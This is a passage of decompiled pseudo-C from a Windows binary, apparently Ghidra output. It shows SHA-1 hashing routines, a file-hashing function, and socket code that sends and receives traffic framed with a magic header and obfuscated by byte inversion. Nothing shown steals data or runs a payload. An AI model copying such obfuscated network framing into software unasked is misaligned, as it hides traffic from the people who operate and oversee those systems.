          *(int *)(param_1 + 0x54) + uVar5;
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x20) ^
          *(uint *)(param_1 + 0x58);
  *(uint *)(param_1 + 0x58) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar6 & uVar7 | (uVar6 ^ uVar7) & uVar8) + -0x70e44324 +
          *(int *)(param_1 + 0x58) + uVar4;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x24) ^
          *puVar1;
  *puVar1 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar5 & uVar2 | (uVar5 ^ uVar2) & uVar7) + -0x70e44324 +
          *puVar1 + uVar8;
  uVar6 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x28) ^
          *(uint *)(param_1 + 0x20);
  *(uint *)(param_1 + 0x20) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar4 & uVar6 | (uVar4 ^ uVar6) & uVar2) + -0x70e44324 +
          *(int *)(param_1 + 0x20) + uVar7;
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x2c) ^
          *(uint *)(param_1 + 0x24);
  *(uint *)(param_1 + 0x24) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar8 & uVar5 | (uVar8 ^ uVar5) & uVar6) + -0x70e44324 +
          *(int *)(param_1 + 0x24) + uVar2;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *puVar1 ^ *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x30) ^
          *(uint *)(param_1 + 0x28);
  *(uint *)(param_1 + 0x28) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar7 & uVar4 | (uVar7 ^ uVar4) & uVar5) + -0x70e44324 +
          *(int *)(param_1 + 0x28) + uVar6;
  uVar8 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x34) ^
          *(uint *)(param_1 + 0x2c);
  *(uint *)(param_1 + 0x2c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar2 & uVar8 | (uVar2 ^ uVar8) & uVar4) + -0x70e44324 +
          *(int *)(param_1 + 0x2c) + uVar5;
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x38) ^
          *(uint *)(param_1 + 0x30);
  *(uint *)(param_1 + 0x30) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar6 & uVar7 | (uVar6 ^ uVar7) & uVar8) + -0x70e44324 +
          *(int *)(param_1 + 0x30) + uVar4;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x3c) ^
          *(uint *)(param_1 + 0x34);
  *(uint *)(param_1 + 0x34) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar5 & uVar2 | (uVar5 ^ uVar2) & uVar7) + -0x70e44324 +
          *(int *)(param_1 + 0x34) + uVar8;
  uVar6 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x40) ^
          *(uint *)(param_1 + 0x38);
  *(uint *)(param_1 + 0x38) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar4 & uVar6 | (uVar4 ^ uVar6) & uVar2) + -0x70e44324 +
          *(int *)(param_1 + 0x38) + uVar7;
  uVar5 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x30) ^ *puVar1 ^ *(uint *)(param_1 + 0x44) ^
          *(uint *)(param_1 + 0x3c);
  *(uint *)(param_1 + 0x3c) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar8 & uVar5 | (uVar8 ^ uVar5) & uVar6) + -0x70e44324 +
          *(int *)(param_1 + 0x3c) + uVar2;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x34) ^ *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x48) ^
          *(uint *)(param_1 + 0x40);
  *(uint *)(param_1 + 0x40) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar7 & uVar4 | (uVar7 ^ uVar4) & uVar5) + -0x70e44324 +
          *(int *)(param_1 + 0x40) + uVar6;
  uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x4c) ^
          *(uint *)(param_1 + 0x44);
  *(uint *)(param_1 + 0x44) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar2 & uVar7 | (uVar2 ^ uVar7) & uVar4) + -0x70e44324 +
          *(int *)(param_1 + 0x44) + uVar5;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x50) ^
          *(uint *)(param_1 + 0x48);
  *(uint *)(param_1 + 0x48) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar6 & uVar8 | (uVar6 ^ uVar8) & uVar7) + -0x70e44324 +
          *(int *)(param_1 + 0x48) + uVar4;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x54) ^
          *(uint *)(param_1 + 0x4c);
  *(uint *)(param_1 + 0x4c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar5 ^ uVar2 ^ uVar8) + -0x359d3e2a +
          *(int *)(param_1 + 0x4c) + uVar7;
  uVar5 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x30) ^ *(uint *)(param_1 + 0x58) ^
          *(uint *)(param_1 + 0x50);
  *(uint *)(param_1 + 0x50) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar4 ^ uVar5 ^ uVar2) + -0x359d3e2a +
          *(int *)(param_1 + 0x50) + uVar8;
  uVar6 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x34) ^ *puVar1 ^
          *(uint *)(param_1 + 0x54);
  *(uint *)(param_1 + 0x54) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar5) + -0x359d3e2a +
          *(int *)(param_1 + 0x54) + uVar2;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x20) ^
          *(uint *)(param_1 + 0x58);
  *(uint *)(param_1 + 0x58) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar8 ^ uVar4 ^ uVar6) + -0x359d3e2a +
          *(int *)(param_1 + 0x58) + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x24) ^
          *puVar1;
  *puVar1 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar2 ^ uVar7 ^ uVar4) + -0x359d3e2a + *puVar1 + uVar6;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x28) ^
          *(uint *)(param_1 + 0x20);
  *(uint *)(param_1 + 0x20) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + -0x359d3e2a +
          *(int *)(param_1 + 0x20) + uVar4;
  uVar2 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x2c) ^
          *(uint *)(param_1 + 0x24);
  *(uint *)(param_1 + 0x24) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar6 ^ uVar2 ^ uVar8) + -0x359d3e2a +
          *(int *)(param_1 + 0x24) + uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *puVar1 ^ *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x30) ^
          *(uint *)(param_1 + 0x28);
  *(uint *)(param_1 + 0x28) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar4 ^ uVar5 ^ uVar2) + -0x359d3e2a +
          *(int *)(param_1 + 0x28) + uVar8;
  uVar6 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x34) ^
          *(uint *)(param_1 + 0x2c);
  *(uint *)(param_1 + 0x2c) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar5) + -0x359d3e2a +
          *(int *)(param_1 + 0x2c) + uVar2;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x50) ^ *(uint *)(param_1 + 0x38) ^
          *(uint *)(param_1 + 0x30);
  *(uint *)(param_1 + 0x30) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar8 ^ uVar4 ^ uVar6) + -0x359d3e2a +
          *(int *)(param_1 + 0x30) + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x54) ^ *(uint *)(param_1 + 0x3c) ^
          *(uint *)(param_1 + 0x34);
  *(uint *)(param_1 + 0x34) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar2 ^ uVar7 ^ uVar4) + -0x359d3e2a +
          *(int *)(param_1 + 0x34) + uVar6;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x58) ^ *(uint *)(param_1 + 0x40) ^
          *(uint *)(param_1 + 0x38);
  *(uint *)(param_1 + 0x38) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + -0x359d3e2a +
          *(int *)(param_1 + 0x38) + uVar4;
  uVar2 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x30) ^ *puVar1 ^ *(uint *)(param_1 + 0x44) ^
          *(uint *)(param_1 + 0x3c);
  *(uint *)(param_1 + 0x3c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar6 ^ uVar2 ^ uVar8) + -0x359d3e2a +
          *(int *)(param_1 + 0x3c) + uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x34) ^ *(uint *)(param_1 + 0x20) ^ *(uint *)(param_1 + 0x48) ^
          *(uint *)(param_1 + 0x40);
  *(uint *)(param_1 + 0x40) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar8 = (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar4 ^ uVar5 ^ uVar2) + -0x359d3e2a +
          *(int *)(param_1 + 0x40) + uVar8;
  uVar6 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar4 = *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x24) ^ *(uint *)(param_1 + 0x4c) ^
          *(uint *)(param_1 + 0x44);
  *(uint *)(param_1 + 0x44) = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar8 >> 0x1b | uVar8 * 0x20) + (uVar7 ^ uVar6 ^ uVar5) + -0x359d3e2a +
          *(int *)(param_1 + 0x44) + uVar2;
  uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x3c) ^ *(uint *)(param_1 + 0x28) ^ *(uint *)(param_1 + 0x50) ^
          *(uint *)(param_1 + 0x48);
  *(uint *)(param_1 + 0x48) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar5 = (uVar2 >> 0x1b | uVar2 * 0x20) + (uVar8 ^ uVar4 ^ uVar6) + -0x359d3e2a +
          *(int *)(param_1 + 0x48) + uVar5;
  uVar7 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x40) ^ *(uint *)(param_1 + 0x2c) ^ *(uint *)(param_1 + 0x54) ^
          *(uint *)(param_1 + 0x4c);
  *(uint *)(param_1 + 0x4c) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar6 = (uVar5 >> 0x1b | uVar5 * 0x20) + (uVar2 ^ uVar7 ^ uVar4) + -0x359d3e2a +
          *(int *)(param_1 + 0x4c) + uVar6;
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(param_1 + 0x44) ^ *(uint *)(param_1 + 0x30) ^ *(uint *)(param_1 + 0x58) ^
          *(uint *)(param_1 + 0x50);
  *(uint *)(param_1 + 0x50) = uVar2 << 1 | (uint)((int)uVar2 < 0);
  uVar4 = (uVar6 >> 0x1b | uVar6 * 0x20) + (uVar5 ^ uVar8 ^ uVar7) + -0x359d3e2a +
          *(int *)(param_1 + 0x50) + uVar4;
  uVar2 = uVar5 >> 2 | uVar5 * 0x40000000;
  uVar3 = *(uint *)(param_1 + 0x48) ^ *(uint *)(param_1 + 0x34) ^ *puVar1 ^
          *(uint *)(param_1 + 0x54);
  *(uint *)(param_1 + 0x54) = uVar3 << 1 | (uint)((int)uVar3 < 0);
  uVar7 = (uVar4 >> 0x1b | uVar4 * 0x20) + (uVar6 ^ uVar2 ^ uVar8) + -0x359d3e2a +
          *(int *)(param_1 + 0x54) + uVar7;
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar5 = *(uint *)(param_1 + 0x4c) ^ *(uint *)(param_1 + 0x38) ^ *(uint *)(param_1 + 0x20) ^
          *(uint *)(param_1 + 0x58);
  *(uint *)(param_1 + 0x58) = uVar5 << 1 | (uint)((int)uVar5 < 0);
  *(uint *)(param_1 + 8) =
       *(int *)(param_1 + 8) +
       (uVar7 >> 0x1b | uVar7 * 0x20) + (uVar4 ^ uVar3 ^ uVar2) + -0x359d3e2a +
       *(int *)(param_1 + 0x58) + uVar8;
  *(uint *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + uVar7;
  *(uint *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + (uVar4 >> 2 | uVar4 * 0x40000000);
  *(uint *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + uVar3;
  *(uint *)(param_1 + 0x18) = *(int *)(param_1 + 0x18) + uVar2;
  return;
}



void __cdecl FUN_00406ed0(undefined4 *param_1)

{
  param_1[1] = 0;
  *param_1 = 0;
  param_1[2] = 0x67452301;
  param_1[3] = 0xefcdab89;
  param_1[4] = 0x98badcfe;
  param_1[5] = 0x10325476;
  param_1[6] = 0xc3d2e1f0;
  return;
}



void __cdecl FUN_00406f20(void *param_1,uint param_2,uint *param_3)

{
  int local_14;
  uint local_10;
  uint local_c;
  void *local_8;
  
  local_10 = *param_3 & 0x3f;
  local_c = 0x40 - local_10;
  local_8 = param_1;
  *param_3 = *param_3 + param_2;
  if (*param_3 < param_2) {
    param_3[1] = param_3[1] + 1;
  }
  while (local_c <= param_2) {
    _memcpy((void *)((int)param_3 + local_10 + 0x1c),local_8,local_c);
    local_8 = (void *)((int)local_8 + local_c);
    param_2 = param_2 - local_c;
    local_c = 0x40;
    local_10 = 0;
    local_14 = 0x10;
    while (local_14 != 0) {
      param_3[local_14 + 6] =
           param_3[local_14 + 6] >> 0x18 | (param_3[local_14 + 6] & 0xff00) << 8 |
           param_3[local_14 + 6] >> 8 & 0xff00ff00 | param_3[local_14 + 6] << 0x18;
      local_14 = local_14 + -1;
    }
    FUN_00405770((int)param_3);
  }
  _memcpy((void *)((int)param_3 + local_10 + 0x1c),local_8,param_2);
  return;
}



void __cdecl FUN_00407030(int param_1,uint *param_2)

{
  uint uVar1;
  uint uVar2;
  uint local_c;
  uint local_8;
  
  uVar1 = *param_2;
  uVar2 = uVar1 & 0x3f;
  local_c = uVar2 + 3 >> 2;
  while (local_c != 0) {
    param_2[local_c + 6] =
         param_2[local_c + 6] >> 0x18 | (param_2[local_c + 6] & 0xff00) << 8 |
         param_2[local_c + 6] >> 8 & 0xff00ff00 | param_2[local_c + 6] << 0x18;
    local_c = local_c - 1;
  }
  *(uint *)((int)param_2 + (uVar1 & 0x3c) + 0x1c) =
       -0x80 << (sbyte)((~uVar2 & 3) << 3) & *(uint *)((int)param_2 + (uVar1 & 0x3c) + 0x1c);
  *(uint *)((int)param_2 + (uVar1 & 0x3c) + 0x1c) =
       0x80 << (sbyte)((~uVar2 & 3) << 3) | *(uint *)((int)param_2 + (uVar1 & 0x3c) + 0x1c);
  if (uVar2 < 0x38) {
    local_8 = (uVar2 >> 2) + 1;
  }
  else {
    if (uVar2 < 0x3c) {
      param_2[0x16] = 0;
    }
    FUN_00405770((int)param_2);
    local_8 = 0;
  }
  for (; local_8 < 0xe; local_8 = local_8 + 1) {
    param_2[local_8 + 7] = 0;
  }
  param_2[0x15] = param_2[1] << 3 | *param_2 >> 0x1d;
  param_2[0x16] = *param_2 << 3;
  FUN_00405770((int)param_2);
  for (local_8 = 0; local_8 < 0x14; local_8 = local_8 + 1) {
    *(char *)(param_1 + local_8) =
         (char)(*(uint *)((int)param_2 + (local_8 & 0xfffffffc) + 8) >> (sbyte)((~local_8 & 3) << 3)
               );
  }
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_004071c0(undefined4 *param_1,wchar_t *param_2)

{
  uint local_1078;
  undefined local_1074 [4096];
  uint local_74;
  uint local_70;
  uint local_6c [24];
  FILE *local_c;
  size_t local_8;
  
  local_8 = 0x4071cd;
  local_74 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_c = (FILE *)0x0;
  local_1078 = 0;
  __wfopen_s(&local_c,param_2,(wchar_t *)&DAT_00427180);
  if (local_c == (FILE *)0x0) {
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
    param_1[3] = 0;
    param_1[4] = 0;
  }
  else {
    _fseek(local_c,0,2);
    local_70 = _ftell(local_c);
    _fseek(local_c,0,0);
    FUN_00406ed0(local_6c);
    while (local_8 = _fread(local_1074,1,0x1000,local_c), local_8 != 0) {
      FUN_00406f20(local_1074,local_8,local_6c);
      local_1078 = local_1078 + local_8;
    }
    FUN_00407030((int)param_1,local_6c);
    _fclose(local_c);
    if (local_1078 < local_70) {
      *param_1 = 0;
      param_1[1] = 0;
      param_1[2] = 0;
      param_1[3] = 0;
      param_1[4] = 0;
    }
  }
  ___security_check_cookie_4(local_74 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00407300(char *param_1,undefined2 param_2,int *param_3,wchar_t *param_4)

{
  int iVar1;
  wchar_t local_9c4;
  undefined local_9c2 [2050];
  ulong local_1c0;
  int local_1bc;
  undefined4 local_1b8;
  hostent *local_1b4;
  undefined2 local_1b0;
  undefined2 local_1ae;
  undefined4 local_1ac;
  wchar_t *local_1a0;
  WSADATA local_19c;
  uint local_c;
  int local_8;
  
  local_c = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_9c4 = L'\0';
  _memset(local_9c2,0,0x7fe);
  local_1a0 = &local_9c4;
  if (param_4 != (wchar_t *)0x0) {
    local_1a0 = param_4;
  }
  *local_1a0 = L'\0';
  local_1c0 = 0;
  local_1bc = 0;
  local_1b8 = 0;
  local_8 = WSAStartup(0x101,&local_19c);
  if (local_8 == 0) {
    iVar1 = Ordinal_23(2,1,6);
    *param_3 = iVar1;
    if (*param_3 == -1) {
      _wcscpy_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426df4);
      _wcscat_s(local_1a0,0x3ff,(wchar_t *)&DAT_00426e14);
      _wcscat_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426e18);
    }
    else {
      local_1b4 = gethostbyname(param_1);
      if (local_1b4 == (hostent *)0x0) {
        local_1c0 = inet_addr(param_1);
        local_1b4 = gethostbyaddr((char *)&local_1c0,4,2);
      }
      if (local_1b4 == (hostent *)0x0) {
        _wcscpy_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426e58);
        _wcscat_s(local_1a0,0x3ff,(wchar_t *)&DAT_00426e78);
        _wcscat_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426e7c);
      }
      else {
        local_1ac = *(undefined4 *)*local_1b4->h_addr_list;
        local_1b0 = 2;
        local_1ae = Ordinal_9(param_2);
        iVar1 = Ordinal_4(*param_3,&local_1b0,0x10);
        if (iVar1 == 0) {
          local_1bc = 1;
        }
        else {
          _wcscpy_s(local_1a0,0x3ff,(wchar_t *)&DAT_00426ebc);
          _wcscat_s(local_1a0,0x3ff,(wchar_t *)&DAT_00426edc);
          _wcscat_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426ee0);
        }
      }
      if ((local_1bc == 0) && (*param_3 != 0)) {
        Ordinal_3(*param_3);
        *param_3 = 0;
      }
    }
  }
  else {
    _wcscpy_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426d90);
    _wcscat_s(local_1a0,0x3ff,(wchar_t *)&DAT_00426db0);
    _wcscat_s(local_1a0,0x3ff,(wchar_t *)&LAB_00426db4);
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_004075d0(int *param_1)

{
  int iVar1;
  
  if (*param_1 != 0) {
    iVar1 = Ordinal_3(*param_1);
    if (iVar1 != 0) {
      return 0;
    }
    *param_1 = 0;
  }
  return 1;
}



undefined4 __cdecl FUN_00407600(int *param_1,void *param_2,size_t param_3)

{
  int iVar1;
  int local_1c;
  undefined4 local_18;
  short *local_10;
  
  local_18 = 0;
  if (*param_1 != 0) {
    for (local_1c = 0; local_1c < (int)param_3; local_1c = local_1c + 1) {
      *(byte *)((int)param_2 + local_1c) = ~*(byte *)((int)param_2 + local_1c);
    }
    local_10 = (short *)operator_new(param_3 + 7);
    *local_10 = (short)param_3 + 5;
    *(undefined4 *)(local_10 + 1) = DAT_0042b0e0;
    *(undefined *)(local_10 + 3) = DAT_0042b0e4;
    _memcpy((void *)((int)local_10 + 7),param_2,param_3);
    iVar1 = Ordinal_19(*param_1,local_10,param_3 + 7,0);
    if ((iVar1 != -1) && (iVar1 == param_3 + 7)) {
      local_18 = 1;
    }
  }
  if (local_10 != (short *)0x0) {
    FUN_00410837(local_10);
  }
  return local_18;
}



void __cdecl
FUN_00407720(int *param_1,undefined2 param_2,void *param_3,size_t param_4,undefined2 *param_5)

{
  int iVar1;
  size_t local_820;
  undefined2 local_81c;
  undefined local_81a [2050];
  uint local_18;
  undefined4 local_14;
  size_t local_10;
  undefined2 *local_c;
  undefined2 *local_8;
  
  local_18 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_81c = 0;
  _memset(local_81a,0,0x7fe);
  local_8 = &local_81c;
  if (param_5 != (undefined2 *)0x0) {
    local_8 = param_5;
  }
  *local_8 = 0;
  local_14 = 0;
  if (*param_1 != 0) {
    if (0xfffa < (int)param_4) {
      param_4 = 0xfffa;
    }
    local_c = (undefined2 *)operator_new(0x1000);
    local_10 = param_4;
    if (0xffa < (int)param_4) {
      local_10 = 0xffa;
    }
    *local_c = param_2;
    *(size_t *)(local_c + 1) = param_4;
    if ((param_3 == (void *)0x0) && (param_4 == 0)) {
      iVar1 = FUN_00407600(param_1,local_c,local_10 + 6);
      if (iVar1 == 0) goto LAB_004078d7;
    }
    else {
      _memcpy(local_c + 3,param_3,local_10);
      iVar1 = FUN_00407600(param_1,local_c,local_10 + 6);
      if (iVar1 == 0) goto LAB_004078d7;
      for (; (int)local_10 < (int)param_4; local_10 = local_10 + local_820) {
        if ((int)(param_4 - local_10) < 0x1001) {
          local_820 = param_4 - local_10;
        }
        else {
          local_820 = 0x1000;
        }
        _memcpy(local_c,(void *)((int)param_3 + local_10),local_820);
        iVar1 = FUN_00407600(param_1,local_c,local_820);
        if (iVar1 == 0) goto LAB_004078d7;
      }
    }
    local_14 = 1;
  }
LAB_004078d7:
  if (local_c != (undefined2 *)0x0) {
    FUN_00410837(local_c);
  }
  local_c = (undefined2 *)0x0;
  ___security_check_cookie_4(local_18 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00407910(int *param_1,void *param_2,size_t *param_3,wchar_t *param_4)

{
  int iVar1;
  undefined4 *puVar2;
  char *pcVar3;
  bool bVar4;
  int local_8f4;
  wchar_t local_8ec;
  undefined local_8ea [2046];
  undefined2 local_ec;
  uint local_20;
  undefined4 local_1c;
  char *local_18;
  ushort local_14;
  size_t local_10;
  int local_c;
  wchar_t *local_8;
  
  local_20 = DAT_0042a044 ^ (uint)&stack0xfffffffc;
  local_8ec = L'\0';
  _memset(local_8ea,0,0x7fe);
  local_8 = &local_8ec;
  if (param_4 != (wchar_t *)0x0) {
    local_8 = param_4;
  }
  *local_8 = L'\0';
  local_18 = (char *)0x0;
  local_10 = 0;
  local_c = 0;
  local_1c = 0;
  if ((*param_1 != 0) && (param_2 != (void *)0x0)) {
    local_ec = local_ec & 0xff00;
    _memset((void *)((int)&local_ec + 1),0,199);
    local_14 = 0;
    local_c = Ordinal_16(*param_1,&local_ec,2,0);
    if ((local_c == -1) || (local_c == 0)) {
      _wcscpy_s(local_8,0x3ff,(wchar_t *)&DAT_00426f20);
    }
    else {
      local_14 = local_ec;
      local_10 = 0;
      local_18 = (char *)operator_new(local_ec + 2);
      for (; (int)local_10 < (int)(uint)local_14; local_10 = local_10 + local_c) {
        local_c = Ordinal_16(*param_1,local_18 + local_10,local_14 - local_10,0);
        if ((local_c == -1) || (local_c == 0)) {
          _wcscpy_s(local_8,0x3ff,(wchar_t *)&DAT_00426f80);
          Ordinal_111();
          goto LAB_00407b90;
        }
      }
      if (4 < (int)local_10) {
        local_10 = local_10 - 5;
        iVar1 = 5;
        bVar4 = true;
        puVar2 = &DAT_0042b0e0;
        pcVar3 = local_18;
        do {
          if (iVar1 == 0) break;
          iVar1 = iVar1 + -1;
          bVar4 = *(char *)puVar2 == *pcVar3;
          puVar2 = (undefined4 *)((int)puVar2 + 1);
          pcVar3 = pcVar3 + 1;
        } while (bVar4);
        if (bVar4) {
          for (local_8f4 = 0; local_8f4 < (int)local_10; local_8f4 = local_8f4 + 1) {
            local_18[local_8f4 + 5] = ~local_18[local_8f4 + 5];
          }
          if ((int)*param_3 < (int)local_10) {
            _memcpy(param_2,local_18 + 5,*param_3);
          }
          else {
            _memcpy(param_2,local_18 + 5,local_10);
            *param_3 = local_10;
          }
          local_1c = 1;
        }
        else {
          _wcscpy_s(local_8,0x3ff,(wchar_t *)&DAT_00426fe0);
        }
      }
    }
  }
LAB_00407b90:
  if (local_18 != (char *)0x0) {
    FUN_00410837(local_18);
  }
  local_18 = (char *)0x0;
  ___security_check_cookie_4(local_20 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl
FUN_00407bd0(int *param_1,undefined2 *param_2,int param_3,size_t *param_4,wchar_t *param_5)

{
  int iVar1;
